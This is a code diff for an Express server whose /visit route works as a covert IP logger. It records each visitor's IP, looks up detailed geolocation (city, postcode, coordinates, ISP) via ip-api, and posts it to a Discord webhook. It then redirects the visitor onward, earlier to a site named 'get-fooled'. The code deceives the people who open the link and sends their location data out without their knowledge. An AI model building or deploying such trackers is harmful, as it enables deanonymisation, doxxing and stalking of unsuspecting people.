@@ -18,9 +18,8 @@ app.get("/visit", async (req, res) => {
     console.log("Visitor IP:", ip);
 
     try {
-        const geoResponse = await fetch(`https://ip-api.com/json/${ip}?fields=query,status,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname`);
+        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=query,status,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname`);
         const geoData = await geoResponse.json();
-        console.log("Geo data:", geoData);
 
         const payload = {
             content: `📢 New visitor detected!
@@ -42,17 +41,16 @@ app.get("/visit", async (req, res) => {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         });
+        console.log("Discord response status:", discordResponse.status);
 
-        console.log("Discord response status:", discordResponse.status, discordResponse.ok ? "OK" : "Failed");
-        if (!discordResponse.ok) console.error("Discord webhook failed:", await discordResponse.text());
-
-        res.redirect("https://get-fooled.onrender.com");
+        // Redirect user to your Render website
+        res.redirect("https://wasted-potentials-management.onrender.com");
     } catch (err) {
         console.error("Error sending to Discord:", err);
         res.sendStatus(500);
     }
 });
 
-// Use Render's port and bind to 0.0.0.0
+// Use Render's assigned port and bind to 0.0.0.0
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
